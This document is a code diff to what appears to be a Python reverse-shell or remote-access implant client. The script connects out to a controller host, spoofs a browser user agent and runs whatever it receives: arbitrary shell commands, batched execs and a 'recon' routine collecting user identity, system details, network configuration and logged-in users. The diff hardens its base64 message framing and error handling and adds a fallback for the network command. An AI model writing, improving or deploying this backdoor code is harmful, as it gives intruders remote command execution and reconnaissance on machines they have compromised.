@@ -11,6 +11,7 @@ import logging as log
 import subprocess as sp
 from datetime import datetime
 
+SBUF_LEN = 9
 SIZE = 4096
 UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
 
@@ -42,19 +43,25 @@ def ctrl_shell_client(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     while True:
-        inp = sockrecv(s)
-        if inp == 'fin':
-            break
-        elif inp == 'getprompt':
-            socksend(s, get_prompt())
-        elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-            socksend(s, ctrl_shell_exec(inp))
-        elif inp == 'recon':
-            socksend(s, ctrl_shell_recon())
-        elif inp.startswith('shell '):
-            socksend(s, cmd_exec(inp[6:]).strip())
-        else:
-            socksend(s, 'Unrecognized')
+        try:
+            inp = sockrecv(s)
+            if inp == 'fin':
+                break
+            elif inp == 'getprompt':
+                socksend(s, get_prompt())
+            elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
+                socksend(s, ctrl_shell_exec(inp))
+            elif inp == 'recon':
+                socksend(s, ctrl_shell_recon())
+            elif inp.startswith('shell '):
+                socksend(s, cmd_exec(inp[6:]).strip())
+            else:
+                socksend(s, 'Unrecognized')
+        except socket.error as e:
+            if e.message == 'too much data!':
+                socksend(s, 'psh : ' + e.message)
+            else:
+                raise
     s.close()
 
 
@@ -68,7 +75,8 @@ def ctrl_shell_exec(inp):
 
 
 def ctrl_shell_recon():
-    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "ifconfig" "w" "who -a"'
+    ipcmd = 'ip addr' if 'no' in cmd_exec('which ifconfig') else 'ifconfig'
+    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
     return ctrl_shell_exec(exec_str)
 
 
@@ -92,7 +100,10 @@ def socksend(s, msg):
     """
 
     pkg = base64.b64encode(msg)
-    pkg_size = '{:0>5d}'.format((len(pkg)))
+    fmt = '{:0>%dd}' % SBUF_LEN
+    pkg_size = fmt.format(len(pkg))
+    if len(pkg_size) > SBUF_LEN:
+        raise socket.error('too much data!')
     pkg = pkg_size + pkg
     sent = s.sendall(pkg)
     if sent:
@@ -106,7 +117,7 @@ def sockrecv(s):
         Returns the message.
 
         TODO: Under high network loads, it's possible that the initial recv
-        may not even return the first 5 bytes so another loop is necessary
+        may not even return the first 9 bytes so another loop is necessary
         to ascertain that.
     """
 
@@ -115,7 +126,7 @@ def sockrecv(s):
     initial = s.recv(SIZE)
     if not initial:
         raise socket.error('socket connection broken')
-    msglen, initial = (int(initial[:5]), initial[5:])
+    msglen, initial = (int(initial[:SBUF_LEN]), initial[SBUF_LEN:])
     bytes_recvd = len(initial)
     chunks.append(initial)
     while bytes_recvd < msglen:
